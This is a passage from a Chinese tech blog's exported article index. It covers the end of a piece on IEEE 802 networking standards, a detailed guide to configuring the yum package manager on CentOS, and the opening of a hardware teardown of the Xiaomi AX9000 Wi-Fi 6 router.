LLC头用以标志上层协议。<br>其定义了有线以太网的物理层和数据链路层的媒体访问控制(MAC) ，通常用于局域网(LAN) ，基于各种类型的铜缆或光纤电缆在节点（集线器、交换机、路由器）之间建立物理连接。<br>多数场景采用CSMA&#x2F;CD协议，即：载波侦听多路访问&#x2F;碰撞检测（Carrier Sense Multiple Access with Collision Detection），也支持CSMA&#x2F;CA协议（Collision Avoidance）。</p>\n<ul>\n<li><strong>802.3</strong> &#x3D; 10M以太网</li>\n<li><strong>802.3a</strong> &#x3D; 百兆以太网</li>\n<li><strong>802.3ab</strong> &#x3D; 基于双绞线的千兆以太网</li>\n<li><strong>802.3z</strong> &#x3D; 基于光纤的千兆以太网</li>\n<li><strong>802.3ad</strong> &#x3D; 双链路聚合的2.5G</li>\n<li><strong>802.3af</strong> &#x3D; 基于以太网的供电，即POE（Power over Ethernet）</li>\n<li><strong>802.3aq</strong> &#x3D; 基于多模光纤的万兆以太网，速率为 10 Gbit&#x2F;s (1,250 MB&#x2F;s)</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11ax\">IEEE 802.11ax 的 Wiki</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11\">IEEE 802.11 的 Wiki</a></li>\n<li><a href=\"https://www.zhihu.com/question/39183519/answer/1156959383\">如何看待 WiFi 联盟发布的 802.11ah WiFi 标准 “HaLow” ？</a></li>\n<li><a href=\"http://www.semiinsights.com/s/electronic_components/23/38911.shtml\">关于WiFi 6技术，这篇说得最详细</a></li>\n<li><a href=\"https://www.ruijie.com.cn/fa/xw-hlw/81858/\">第七代无线技术802.11ax详解</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a44484.html\">Wi-Fi 技术的演进</a></li>\n</ul>\n"},{"title":"Yum软件包管理器的技术分析","url":"/2020/06/27/Yum%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>YUM（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。它基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，无须繁琐地一次次下载、安装。</p>\n<p>yum 的理念是使用一个中心仓库(repository)管理一部分甚至一个distribution 的应用程序相互关系，根据计算出来的软件依赖关系进行相关的升级、安装、删除等等操作，减少了Linux 用户一直头痛的dependencies 的问题。这一点上，yum 和apt 相同。apt 原为debian 的deb 类型软件管理所使用，但是现在也能用到RedHat 门下的rpm 了。此外，由于yum是用python编写的，因此你会发现它和pip的功能非常相似，语法也非常一致！</p>\n<p>yum 的关键之处是要有可靠的repository，顾名思义，这是软件的仓库，它可以是http 或ftp 站点，也可以是本地软件池，但必须包含rpm 的header，header 包括了rpm 包的各种信息，包括描述，功能，提供的文件，依赖性等。正是收集了这些header 并加以分析，才能自动化地完成余下的任务。</p>\n<p>以Centos 7.8为例，yum软件包主要包含以下部分：</p>\n<ul>\n<li><code>/usr/bin/yum</code>          可执行程序</li>\n<li><code>/etc/yum.conf</code>         主配置文件</li>\n<li><code>/etc/yum.repos.d/</code>    REPO源文件配置目录</li>\n<li><code>/etc/yum/</code>             辅助配置文件目录</li>\n</ul>\n<h2 id=\"主配置文件-etc-yum-conf\"><a href=\"#主配置文件-etc-yum-conf\" class=\"headerlink\" title=\"主配置文件 &#x2F;etc&#x2F;yum.conf\"></a>主配置文件 &#x2F;etc&#x2F;yum.conf</h2><p>yum 的配置文件分为两部分：main 和repository</p>\n<p>main 部分定义了全局配置选项，整个yum 配置文件应该只有一个main, 常位于<code>/etc/yum.conf</code> 中,一般其中只包含main部分的配置选项。</p>\n<p>repository 部分定义了每个源&#x2F;服务器的具体配置，可以有一到多个。常位于<code>/etc/yum.repo.d</code>目录下的各文件中。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># more /etc/yum.conf</span></span><br><span class=\"line\">[main]</span><br><span class=\"line\">cachedir=/var/cache/yum/<span class=\"variable\">$basearch</span>/<span class=\"variable\">$releasever</span></span><br><span class=\"line\"><span class=\"comment\"># yum 缓存的目录，yum 在此存储下载的rpm 包和数据库，默认设置为/var/cache/yum</span></span><br><span class=\"line\">keepcache=0</span><br><span class=\"line\"><span class=\"comment\"># 安装完成后是否保留软件包，0为不保留（默认为0），1为保留</span></span><br><span class=\"line\">debuglevel=2</span><br><span class=\"line\">logfile=/var/log/yum.log</span><br><span class=\"line\"><span class=\"comment\"># yum 日志文件位置。用户可以到/var/log/yum.log 文件去查询过去所做的更新</span></span><br><span class=\"line\">exactarch=1</span><br><span class=\"line\"><span class=\"comment\"># 如果设置为1，则yum 只会安装和系统架构匹配的软件包，例如，yum 不会将i686的软件包安装在适合i386的系统中。默认为1。</span></span><br><span class=\"line\">pkgpolicy=newest</span><br><span class=\"line\"><span class=\"comment\"># 包的策略。一共有两个选项，newest 和last，这个作用是如果你设置了多个repository，而同一软件在不同的repository 中同时存在，yum 应该安装哪一个，</span></span><br><span class=\"line\"><span class=\"comment\"># 如果是newest，则yum 会安装最新的那个版本。如果是last，则yum 会将服务器id 以字母表排序，并选择最后的那个服务器上的软件安装。一般都是选newest。</span></span><br><span class=\"line\">obsoletes=1</span><br><span class=\"line\"><span class=\"comment\"># 这是一个update 的参数，具体请参阅yum(8)，简单的说就是相当于upgrade，允许更新陈旧的RPM包。</span></span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\"><span class=\"comment\"># 有1和0两个选择，分别代表是否是否进行gpg(GNU Private Guard) 校验，以确定rpm 包的来源是有效和安全的。</span></span><br><span class=\"line\"><span class=\"comment\"># 这个选项如果设置在[main]部分，则对每个repository 都有效。默认值为0。</span></span><br><span class=\"line\">plugins=1</span><br><span class=\"line\"><span class=\"comment\"># 是否启用插件，默认1为允许，0表示不允许。我们一般会用yum-fastestmirror这个插件。</span></span><br><span class=\"line\">retries=6</span><br><span class=\"line\"><span class=\"comment\"># 网络连接发生错误后的重试次数，如果设为0，则会无限重试。默认值为6.</span></span><br><span class=\"line\">installonly_limit=5</span><br><span class=\"line\">bugtracker_url=http://bugs.centos.org/set_project.php?project_id=23&amp;ref=http://bugs.centos.org/bug_report_page.php?categ</span><br><span class=\"line\">ory=yum</span><br><span class=\"line\">distroverpkg=centos-release</span><br><span class=\"line\"><span class=\"comment\"># 指定一个软件包，yum 会根据这个包判断你的发行版本</span></span><br></pre></td></tr></table></figure>\n\n<p>distroverpkg字段定义了当前yum使用的基础包，这里指明是centos-release包，下面分析该包的版本信息</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># rpm -qi centos-release</span></span><br><span class=\"line\">Name        : centos-release</span><br><span class=\"line\">Version     : 7</span><br><span class=\"line\"><span class=\"comment\"># 这里定义了发行版本号 $releasever，隐藏得很深啊！</span></span><br><span class=\"line\">Release     : 8.2003.0.el7.centos</span><br><span class=\"line\">Architecture: x86_64</span><br><span class=\"line\"><span class=\"comment\"># 这里定义了CPU基础架构 $basearch，隐藏得很深啊！</span></span><br><span class=\"line\">Install Date: 2020年06月25日 星期四 23时01分29秒</span><br><span class=\"line\">Group       : System Environment/Base</span><br><span class=\"line\">Size        : 43849</span><br><span class=\"line\">License     : GPLv2</span><br><span class=\"line\">Signature   : RSA/SHA256, 2020年04月14日 星期二 11时54分48秒, Key ID 24c6a8a7f4a80eb5</span><br><span class=\"line\">Source RPM  : centos-release-7-8.2003.0.el7.centos.src.rpm</span><br><span class=\"line\">Build Date  : 2020年04月07日 星期二 18时01分12秒</span><br><span class=\"line\">Build Host  : x86-01.bsys.centos.org</span><br><span class=\"line\">Relocations : (not relocatable)</span><br><span class=\"line\">Packager    : CentOS BuildSystem &lt;http://bugs.centos.org&gt;</span><br><span class=\"line\">Vendor      : CentOS</span><br><span class=\"line\">Summary     : CentOS Linux release file</span><br><span class=\"line\">Description :</span><br><span class=\"line\">CentOS Linux release files</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于预置变量的定义\"><a href=\"#关于预置变量的定义\" class=\"headerlink\" title=\"关于预置变量的定义\"></a>关于预置变量的定义</h3><p>REPO源文件中，经常用到的变量有：</p>\n<ul>\n<li><code>$releasever</code>：当前系统的发行版本号，例如 “7”</li>\n<li><code>$basearch</code>： 当前系统的CPU架构，例如“x86-64”</li>\n<li><code>$arch</code>： 类似<code>$basearch</code></li>\n<li><code>/etc/yum.conf</code> 中定义的各个变量。 由于yum是用Python写的，该配置文件中的变量均可以在repo定义中被引用</li>\n<li><code>/etc/yum/vars</code> 中各个文件包含的自定义变量，例如<code>$infra</code>等</li>\n</ul>\n<h2 id=\"REPO源配置文件目录-etc-yum-repos-d\"><a href=\"#REPO源配置文件目录-etc-yum-repos-d\" class=\"headerlink\" title=\"REPO源配置文件目录 &#x2F;etc&#x2F;yum.repos.d&#x2F;\"></a>REPO源配置文件目录 &#x2F;etc&#x2F;yum.repos.d&#x2F;</h2><p>repository 部分定义了每个源&#x2F;服务器的具体配置，可以有一到多个。常位于<code>/etc/yum.repo.d\\</code>目录下的各文件中。</p>\n<p><code>yum repolist</code>命令列出全部生效的源配置，具体判断逻辑是：</p>\n<ul>\n<li>寻找以下所有文件：<code>/etc/yum.repos.d/*.repo</code></li>\n<li>分析每个repo源文件中，找出所有<code>enabled=1</code>的源标识</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># tree /etc/yum.repos.d</span></span><br><span class=\"line\">yum.repos.d</span><br><span class=\"line\">├── CentOS-Base.repo</span><br><span class=\"line\">├── CentOS-CR.repo</span><br><span class=\"line\">├── CentOS-Debuginfo.repo</span><br><span class=\"line\">├── CentOS-Epel.repo</span><br><span class=\"line\">├── CentOS-fasttrack.repo</span><br><span class=\"line\">├── CentOS-Media.repo</span><br><span class=\"line\">├── CentOS-Sources.repo</span><br><span class=\"line\">├── CentOS-Vault.repo</span><br><span class=\"line\">└── docker-ce.repo</span><br><span class=\"line\"><span class=\"comment\"># 后缀名必须是repo，其他类型文件无效</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM_0_17_centos ~]<span class=\"comment\"># yum repolist</span></span><br><span class=\"line\">已加载插件：fastestmirror, langpacks</span><br><span class=\"line\">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\">源标识                                              源名称                                                        状态</span><br><span class=\"line\">!docker-ce-stable/x86_64                            Docker CE Stable - x86_64                                         77</span><br><span class=\"line\">!epel/7/x86_64                                      EPEL <span class=\"keyword\">for</span> redhat/centos 7 - x86_64                             13,314</span><br><span class=\"line\">!extras/7/x86_64                                    Qcloud centos extras - x86_64                                    397</span><br><span class=\"line\">!os/7/x86_64                                        Qcloud centos os - x86_64                                     10,070</span><br><span class=\"line\">!updates/7/x86_64                                   Qcloud centos updates - x86_64                                   737</span><br><span class=\"line\">repolist: 24,595</span><br><span class=\"line\"><span class=\"comment\"># 源标识：repo文件中的段落名 / $releasever / $basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 源名称：repo文件中的该段落的name - $basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 状态：当前repo源仓库中的rpm包数量</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM_0_17_centos ~]<span class=\"comment\"># cat /etc/yum.repos.d/CentOS-Base.repo</span></span><br><span class=\"line\"></span><br><span class=\"line\">[os]</span><br><span class=\"line\"><span class=\"comment\"># serverid 是用于区别各个不同的repository，必须有一个独一无二的名称，就是repo列表中显示的“”源标识“</span></span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">gpgkey=http://mirrors.tencentyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class=\"line\"><span class=\"comment\"># gpgcheck 定义是否校验GPG KEY；</span></span><br><span class=\"line\">enabled=1</span><br><span class=\"line\"><span class=\"comment\"># enable 定义该源标识是否生效，默认值是”1“</span></span><br><span class=\"line\">baseurl=http://mirrors.tencentyun.com/centos/<span class=\"variable\">$releasever</span>/os/<span class=\"variable\">$basearch</span>/</span><br><span class=\"line\"><span class=\"comment\"># baseurl 定义rpm包的寻址方式，具体解释见下文</span></span><br><span class=\"line\">name=Qcloud centos os - <span class=\"variable\">$basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 定义列表中显示的“”源名称“</span></span><br><span class=\"line\">priority=2</span><br><span class=\"line\"><span class=\"comment\"># 顺序指令：priority=N （N为1到99的正整数，数值越小越优先）。注意：需要yum-priorities插件支持</span></span><br><span class=\"line\"><span class=\"comment\"># 一般配置[base], [addons], [updates], [extras] 的priority=1，[CentOSplus], [contrib] 的priority=2，其他第三的软件源为：priority=N （推荐N&gt;10）</span></span><br><span class=\"line\"></span><br><span class=\"line\">[updates]</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">[extras]</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于baseurl\"><a href=\"#关于baseurl\" class=\"headerlink\" title=\"关于baseurl\"></a>关于baseurl</h3><p>baseurl 支持的协议有 <code>http://</code> <code>ftp://</code> <code>file://</code> 三种。</p>\n<p>baseurl 后可以跟多个url，你可以自己改为速度比较快的镜像站，但baseurl 只能有一个，也就是说不能像如下格式：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">baseurl=url://server1/path/to/repository/</span><br><span class=\"line\">baseurl=url://server2/path/to/repository/</span><br><span class=\"line\">baseurl=url://server3/path/to/repository/</span><br></pre></td></tr></table></figure>\n\n<p>其中url 指向的目录必须是这个repository header 目录的上一级，它也支持<code>$releasever</code>, <code>$basearch</code> 这样的变量。<br>url 之后可以加上多个选项，如gpgcheck、exclude、failovermethod 等，比如：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[updates-released]</span><br><span class=\"line\">name=Fedora Core $releasever - $basearch - Released Updates</span><br><span class=\"line\">baseurl=http://download.atrpms.net/mirrors/fedoracore/updates/$releasever/$basearch</span><br><span class=\"line\">　　　　 http://redhat.linux.ee/pub/fedora/linux/core/updates/$releasever/$basearch</span><br><span class=\"line\">　　　　 http://fr2.rpmfind.net/linux/fedora/core/updates/$releasever/$basearch</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">exclude=gaim</span><br><span class=\"line\">failovermethod=priority</span><br></pre></td></tr></table></figure>\n\n<p>其中gpgcheck，exclude 的含义和[main] 部分相同，但只对此服务器起作用.</p>\n<p>failovermethode 有两个选项roundrobin 和priority，意思分别是有多个url可供选择时，yum 选择的次序.</p>\n<ul>\n<li>roundrobin 是随机选择，如果连接失败则使用下一个，依次循环;</li>\n<li>priority 则根据url 的次序从第一个开始。如果不指明，默认是roundrobin。</li>\n</ul>\n<h3 id=\"关于mirrorlist\"><a href=\"#关于mirrorlist\" class=\"headerlink\" title=\"关于mirrorlist\"></a>关于mirrorlist</h3><p>baseurl是repo定义的核心内容，有时候也可以用mirrorlist代替，例如<br><code>mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</code></p>\n<p>这个url地址用到了<code>$releasever</code>和<code>$basearch</code> 变量，而<code>$infra</code>是在<code>/etc/yum/vars/</code>目录中的自定义变量</p>\n<p>看看这个镜像url地址的返回内容，实际上就是几个可用的镜像url地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># curl &quot;http://mirrorlist.centos.org/?release=7&amp;arch=x86_64&amp;repo=kernel&amp;infra=stock&quot;</span></span><br><span class=\"line\">http://mirrors.huaweicloud.com/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirrors.bfsu.edu.cn/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror-hk.koddos.net/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.worria.com/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.xtom.com.hk/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.aktkn.sg/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://ftp.yz.yamagata-u.ac.jp/pub/linux/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirrors.powernet.com.ru/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.hoster.kz/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://centosu7.centos.org/altarch/7.8.2003/kernel/x86_64/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"yum辅助配置文件目录-etc-yum\"><a href=\"#yum辅助配置文件目录-etc-yum\" class=\"headerlink\" title=\"yum辅助配置文件目录 &#x2F;etc&#x2F;yum&#x2F;\"></a>yum辅助配置文件目录 &#x2F;etc&#x2F;yum&#x2F;</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># tree /etc/yum</span></span><br><span class=\"line\">/etc/yum</span><br><span class=\"line\">├── fssnap.d</span><br><span class=\"line\">├── pluginconf.d                        <span class=\"comment\"># yum插件的配置文件目录</span></span><br><span class=\"line\">│   ├── fastestmirror.conf              <span class=\"comment\"># 默认的镜像测速插件，修改enabled值可以关闭该插件</span></span><br><span class=\"line\">│   └── langpacks.conf                  <span class=\"comment\"># 语言类的插件</span></span><br><span class=\"line\">├── protected.d</span><br><span class=\"line\">│   └── systemd.conf</span><br><span class=\"line\">├── vars                                <span class=\"comment\"># 自定义变量的配置文件目录</span></span><br><span class=\"line\">│   ├── contentdir</span><br><span class=\"line\">│   └── infra                           <span class=\"comment\"># mirrorlist示例中用到了这个自定义变量</span></span><br><span class=\"line\">└── version-groups.conf</span><br></pre></td></tr></table></figure>\n\n<p>目录&#x2F;etc&#x2F;yum&#x2F;vars&#x2F; 下的文件可以自定义变量，并通过$contentdir, $infra 在repo文件中引用</p>\n<h2 id=\"如何查看软件包的文件明细\"><a href=\"#如何查看软件包的文件明细\" class=\"headerlink\" title=\"如何查看软件包的文件明细\"></a>如何查看软件包的文件明细</h2><p>可以使用<code>repoquery</code>命令，可能需要安装<code>yum-utils</code>软件包，即：<code>yum install yum-utils</code><br>具体方法是：<code>repoquery -ql &lt;package-name&gt;</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@analyst cloudinit]# repoquery -ql chrony.x86_64</span><br><span class=\"line\">/etc/NetworkManager/dispatcher.d/20-chrony</span><br><span class=\"line\">/etc/chrony.conf</span><br><span class=\"line\">/etc/chrony.keys</span><br><span class=\"line\">/etc/dhcp/dhclient.d/chrony.sh</span><br><span class=\"line\">/etc/logrotate.d/chrony</span><br><span class=\"line\">/etc/sysconfig/chronyd</span><br><span class=\"line\">/usr/bin/chronyc</span><br><span class=\"line\">/usr/lib/systemd/ntp-units.d/50-chronyd.list</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-dnssrv@.service</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-dnssrv@.timer</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-wait.service</span><br><span class=\"line\">/usr/lib/systemd/system/chronyd.service</span><br><span class=\"line\">/usr/libexec/chrony-helper</span><br><span class=\"line\">/usr/sbin/chronyd</span><br><span class=\"line\">/usr/share/doc/chrony-3.4</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/COPYING</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/FAQ</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/NEWS</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/README</span><br><span class=\"line\">/usr/share/man/man1/chronyc.1.gz</span><br><span class=\"line\">/usr/share/man/man5/chrony.conf.5.gz</span><br><span class=\"line\">/usr/share/man/man8/chronyd.8.gz</span><br><span class=\"line\">/var/lib/chrony</span><br><span class=\"line\">/var/lib/chrony/drift</span><br><span class=\"line\">/var/lib/chrony/rtc</span><br><span class=\"line\">/var/log/chrony</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"如何创建内网的本地-YUM-源\"><a href=\"#如何创建内网的本地-YUM-源\" class=\"headerlink\" title=\"如何创建内网的本地 YUM 源\"></a>如何创建内网的本地 YUM 源</h2><p>可以参见<a href=\"https://www.jianshu.com/p/6c3090968d71\">Centos7通过reposync搭建本地Yum源</a>，其中关键是：</p>\n<ul>\n<li>通过<code>reposync</code>命令，将远程 RPM 资源库同步到本地磁盘</li>\n<li>通过<code>createrepo</code>命令，建立本地 YUM 源</li>\n<li>下载 KEY 文件，引入官方的 RPM GPG 公钥（可选）</li>\n<li>建立 Nginx 文件服务器，启动 http 服务</li>\n</ul>\n<p>注意！openEuler 等发行版不使用 yum-utils 工具包，而是直接使用 dnf 工具包，参数格式可能有所差异！！！</p>\n<hr>\n<h2 id=\"解决yum软件依赖的有效方法\"><a href=\"#解决yum软件依赖的有效方法\" class=\"headerlink\" title=\"解决yum软件依赖的有效方法\"></a>解决yum软件依赖的有效方法</h2><p>若安装失败，并提示缺少依赖，如提示<code>can not find libXss.so.1 libappindicator3.so.1</code>，可先获取依赖包信息 查询命令：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">repoquery --nvr --whatprovides libXss.so.1</span><br><span class=\"line\">repoquery --nvr --whatprovides libappindicator3.so.1</span><br></pre></td></tr></table></figure>\n\n<p>查询repoquery的输出结果 ,找到该文件所在的软件包，例如<code>libXScrnSaver-1.2.2-6.1.el7</code><br>立即安装该依赖软件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install libXScrnSaver*</span><br><span class=\"line\">yum install libappindicator*</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录-Using-Yum-Variables\"><a href=\"#附录-Using-Yum-Variables\" class=\"headerlink\" title=\"附录: Using Yum Variables\"></a>附录: Using Yum Variables</h2><p>You can use and reference the following built-in variables inyum commands and in all Yum configuration files (that is,&#x2F;etc&#x2F;yum.conf and all .repo files in the &#x2F;etc&#x2F;yum.repos.d&#x2F;directory):</p>\n<h3 id=\"releasever\"><a href=\"#releasever\" class=\"headerlink\" title=\"$releasever\"></a>$releasever</h3><p>You can use this variable to reference the release version of Red Hat Enterprise Linux. Yum obtains the value of $releasever from the distroverpkg&#x3D;value line in the &#x2F;etc&#x2F;yum.conf configuration file.<br>If there is no such linein &#x2F;etc&#x2F;yum.conf, then yum infers the correct value by deriving theversion number from the redhat-release package.</p>\n<h3 id=\"arch\"><a href=\"#arch\" class=\"headerlink\" title=\"$arch\"></a>$arch</h3><p>You can use this variable to refer to the system’s CPU architecture as returned when calling Python’s os.uname() function.Valid values for $arch include: i586, i686 and x86_64.</p>\n<h3 id=\"basearch\"><a href=\"#basearch\" class=\"headerlink\" title=\"$basearch\"></a>$basearch</h3><p>You can use $basearch to reference the base architecture of the system.<br>For example, i686 and i586 machines both have a base architecture of i386, and AMD64 and Intel64 machines have a base architecture of x86_64.</p>\n<h3 id=\"YUM0-9\"><a href=\"#YUM0-9\" class=\"headerlink\" title=\"$YUM0-9\"></a>$YUM0-9</h3><p>These ten variables are each replaced with the value of anyshell environment variables with the same name.</p>\n<p>If one of the sevariables is referenced (in &#x2F;etc&#x2F;yum.conf for example) and a shell environment variable with the same name does not exist, then the configuration file variable is not replaced.</p>\n<p>To define a custom variable or to override the value of anexisting one, create a file with the same name as the variable(without the “$” sign) in the &#x2F;etc&#x2F;yum&#x2F;vars&#x2F; directory, and add the desired value on its first line.</p>\n<p>For example, repository descriptions often include the operating system name. To define a new variable called $osname,create a new file with “Red Hat Enterprise Linux” on the first lineand save it as <code>/etc/yum/vars/osname:</code></p>\n<p><code># echo “Red Hat Enterprise Linux” &gt;/etc/yum/vars/osname</code></p>\n<p>Instead of “Red Hat Enterprise Linux 6”, you can now use the following in the .repo files: <code>name=$osname $releasever</code></p>\n"},{"title":"Wi-Fi 6的技术专题之四：产品分析","url":"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/","content":"<p>2014年，雷军发布了小米第一台路由器，号称要引领路由器市场的革命，定位是家庭网络入口，形态是路由器+NAS存储。理想很丰满、现实很骨感！两个都想做，两个都做不好，路由器的网络质量屡屡被吐槽，口碑炸裂。。。<br>从Wi-Fi 6开始，小米痛下决心只做纯粹的路由器，招安了斐讯研发团队，芯片也转向高通的整体方案。从早期的AX1800初入江湖到 Redmi AX5\\AX6补全产品线，从AX3600开始普及家用Wi-Fi 6再到AX6000紧跟手机SOC的发展进一步提高无线规格，小米路由器在逐渐在中高端站稳了脚跟，有了进一步向更高层冲击的实力。<br>2021年，小米发布了高端旗舰路由器小米AX9000，这是小米对于Wi-Fi 6时代何为顶级路由器的答卷，更代表着小米踏上了千元高端路由领域新的征程，请参见<a href=\"https://www.mi.com/mirouter/ax9000/specs\">官方主页</a>。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0.png\" class=\"\">\n\n<h2 id=\"一、AX9000的来由\"><a href=\"#一、AX9000的来由\" class=\"headerlink\" title=\"一、AX9000的来由\"></a>一、AX9000的来由</h2><p>小米AX9000路由器，AX代表其采用IEEE 802.11ax标准，那9000是怎么来的呢，其实是多组天线并发的最大速率。当然，这仅仅是理论速率！</p>\n<ul>\n<li>2.4GHz频段：最大速率1147Mbps &#x3D; 4 * 286.8 ，基于HE40、MSC 11、4*4 MIMO</li>\n<li>5.2GHz频段：最大速率4804Mbps &#x3D; 4 * 1201 ，基于HE160、MSC 11、4*4 MIMO</li>\n<li>5.8GHz频段：最大速率2402Mbps &#x3D; 4 * 600.5 ，基于HE180、MSC 11、4*4 MIMO</li>\n</ul>\n<p>此外，小米路由器为智能家居设置了AIoT专用天线，但为了兼容低端设备仅支持802.11ac。</p>\n<ul>\n<li>2.4GHz频段：最大速率150Mbps，基于VHT40、MSC 7</li>\n<li>5GHz频段：最大速率433Mbps，基于VHT80、MSC 9</li>\n</ul>\n<p><code>1147 + 4804 + 2402 + 150 + 433 = 8936</code>，取个整数就是9000了！！！</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/ax9000.png\" class=\"\">\n\n<h2 id=\"二、核心芯片\"><a href=\"#二、核心芯片\" class=\"headerlink\" title=\"二、核心芯片\"></a>二、核心芯片</h2><p>小米现在采用高通的全套方案，产品发布价格999元，但由于全球芯片短缺，现在顺势涨价到1299元，但仍然经常缺货。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%B0%8F%E7%B1%B3AX9000.jpeg\" class=\"\">\n\n<h3 id=\"核心处理模组\"><a href=\"#核心处理模组\" class=\"headerlink\" title=\"核心处理模组\"></a>核心处理模组</h3><ul>\n<li>CPU：Qualcomm IPQ8072A * 1，四核2.2GHz，A53架构，14nm制程，内建双核1.7GHz NPU</li>\n<li>内存：EtronTech M6HE16EWAKG-10H * 2，DDR3L，单个512MB，总计1GB，台湾钰创科技</li>\n<li>闪存：Winbond W29N02GZSIBA * 1，容量256MB，台湾华邦电子</li>\n</ul>\n<h3 id=\"5-2GHz通信模组\"><a href=\"#5-2GHz通信模组\" class=\"headerlink\" title=\"5.2GHz通信模组\"></a>5.2GHz通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN9024 * 1，高档配置，支持4x4 HE160，最高速率4804Mbps，在2x2 MIMO下支持4096-QAM</li>\n<li>射频前端：Qorvo QCN5054 * 4，分别连接4根外置天线</li>\n<li>介质滤波器：5235 * 4，过滤5.8GHz频段干扰，信号衰减2dB。注意：5235指的是仅允许5.235Hz频率通过！</li>\n</ul>\n<h3 id=\"5-8GHz通信模组\"><a href=\"#5-8GHz通信模组\" class=\"headerlink\" title=\"5.8GHz通信模组\"></a>5.8GHz通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN5054 * 1，中档配置，支持4x4 HE160 或 2×2 HE160，不支持4096-QAM</li>\n<li>射频前端：Qorvo QCN5054 * 4，分别连接4根外置天线</li>\n<li>介质滤波器：5697 * 4，过滤5.2GHz频段干扰，信号衰减2dB，功能同上</li>\n</ul>\n<h3 id=\"2-4GHZ通信模组\"><a href=\"#2-4GHZ通信模组\" class=\"headerlink\" title=\"2.4GHZ通信模组\"></a>2.4GHZ通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN5024 * 1，中档配置，支持4x4 HE40，最高速率1147Mbps</li>\n<li>射频前端：Qorvo QPF4288 * 